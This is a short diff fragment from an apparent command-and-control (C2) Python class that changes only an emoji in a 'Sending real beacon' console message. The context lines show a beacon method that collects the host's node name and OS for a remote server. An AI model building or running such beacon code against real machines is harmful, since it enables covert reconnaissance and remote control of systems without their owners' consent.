@@ -20,7 +20,7 @@ class C2:
         return base64.b64decode(data).decode()
 
     def beacon(self):
-        console.print(f"[bold red][☠][/bold red] Sending real beacon to {self.server_url}...")
+        console.print(f"[bold red][][/bold red] Sending real beacon to {self.server_url}...")
         data = {
             "node": os.uname().nodename,
             "os": os.uname().sysname,
